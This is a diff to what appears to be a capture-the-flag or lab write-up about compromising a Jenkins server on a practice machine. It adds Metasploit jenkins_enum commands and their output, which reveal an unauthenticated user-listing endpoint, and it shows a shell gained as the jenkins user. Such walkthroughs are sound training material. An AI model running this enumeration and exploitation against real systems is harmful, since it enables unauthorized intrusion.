@@ -20,8 +20,25 @@ Jenkins is reachable on port `9000`!
 
 ## Information gathering
 
-Jenkins exposes an endpoint (`/people` or `/asynchPeople`) where all the
-defined users are listed. In the target machine, users are
+Typically, Jenkins exposes an endpoint (`/people` or `/asynchPeople`) that
+does not require authentication and where all the defined users are listed.
+Just to be sure, we can use `jenkins_enum` auxiliary
+
+    msf > use auxiliary/scanner/http/jenkins_enum
+    msf auxiliary(jenkins_enum) > set rhosts canyoupwnme
+    msf auxiliary(jenkins_enum) > set rport 9000
+    msf auxiliary(jenkins_enum) > set targeturi /
+    msf auxiliary(jenkins_enum) > exploit
+
+    [*] 10.0.100.195:9000 - Jenkins Version - 1.647
+    [*] 10.0.100.195:9000 - /script restricted (403)
+    [*] 10.0.100.195:9000 - /view/All/newJob restricted (403)
+    [+] 10.0.100.195:9000 - /asynchPeople/ does not require authentication (200)
+    [*] 10.0.100.195:9000 - /systemInfo restricted (403)
+    [*] Scanned 1 of 1 hosts (100% complete)
+    [*] Auxiliary module execution completed
+
+According to `/asynchPeople`, users defined in the target machine are
 
 *   admin (Jarvis)
 *   anonymous (anonymous)
@@ -104,8 +121,6 @@ Let's try with it...
     uid=109(jenkins) gid=117(jenkins) groups=117(jenkins)
     $
 
-Got it!
-
 ## Becoming `root`
 
-Work in progress...
+See "Becoming `root`" section in [Tomcat](./001-tomcat.md).
